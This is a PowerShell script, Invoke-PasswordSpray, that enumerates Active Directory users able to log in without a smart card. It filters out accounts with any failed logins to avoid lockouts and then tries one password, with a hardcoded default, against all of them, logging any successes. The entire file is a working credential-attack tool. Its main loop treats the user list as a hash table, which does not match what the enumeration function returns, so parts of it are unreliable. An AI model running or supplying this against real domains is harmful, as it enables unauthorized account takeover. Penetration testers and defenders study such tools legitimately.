# Invoke-PasswordSpray
# Author: Aaron Jewitt @acjewitt
# Purpose: Safely conduct a password spray attack from within a domain without locking out accounts 
#
# Invoke password spray will query the PDC for all users that are allowed to log in without a smart card
# remove any user from the list if they have any failed login attempts
# and then attempt the selected password against all of those users.

function Get-PDC{
    [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().pdcroleowner.IPAddress
}

function Get-NoCACUsers {
    <#
        .SYNOPSIS
        Runs an LDAP query looking for any user that is able to log in without a CAC, has a bad password count at 0, and is not locked out        
    #>
    $DomainController = (Get-PDC)
    $DCLDAPPort = 389
    $ldapstring = "LDAP://" +$DomainController + ":" + $DCLDAPPort
    $root = [ADSI]$ldapstring
    $search = New-Object System.DirectoryServices.DirectorySearcher($root,"(&(objectClass=user)(objectCategory=person)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=262144)(lockoutTime=0))")
    Write-Host "[-] Querying $DomainController for users that match this filter:"
    Write-Host "[-] " ($search.Filter)
    $noCacUsers = $search.FindAll()
    foreach($result in $noCacUsers){
        if ([int]$result.Properties.badpwdcount[0] -eq 0){
            $result.Properties.samaccountname
        } else {
            write-host "[-] skipping" $result.Properties.samaccountname $result.Properties.badpwdcount " failed logins"
        }
    }
}  

function Test-DomainCredentials {
    [cmdletbinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        [String]$DomainController = (Get-PDC),

        [Parameter(Mandatory=$true)]
        [String]$username,

        [Parameter(Mandatory=$true)]
        [String]$password
    )

    "[-] Testing $DomainController\$username with $password " + (Get-Date).DateTime
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain',$DomainController)
    if ($ds.ValidateCredentials($username,$password)){
        "[+] SUCCESS *********"
        "[+] $username has a password of $password"
        "[+] SUCCESS *********"
    }
}
function Invoke-PasswordSpray {
        [cmdletbinding()]
        param(
        [Parameter()]
        [String]$password = "!QAZXSW@1qazxsw2"
    )
    "[-] Starting a transcript with the results of the script"
    Start-Transcript
    "[-] Getting a list of all Users able to log in without a Token"
    "[-] Pairing each users against a DC where the badpwdcount is zero"
    "[-] You may see errors if the script cannot reach a DC"
    # $accounts is a hash table now, keys are unique
    $accounts = Get-NoCaCUsers 
    # drop it out to a file for later if needed.
    $filename = "NoCaCUsers_" + (Get-Date -Format s) + ".txt"
    $accounts | out-file $filename
    # if the password is not defined use the default list

    "[-] Trying $password against all users. Starting " + (Get-Date -Format s)
    "[-] " + $accounts.Count + "accounts will be tested"
    foreach($username in $accounts.Keys){
        $dc = $accounts.get_item($username)
        #"[+] Trying $username on $dc"; 
        Test-DomainCredentials -password $password -username $username -DomainController $dc
    }
   "[-] Finished all usernames in the list at " + (Get-Date -Format s)
    Stop-Transcript
}



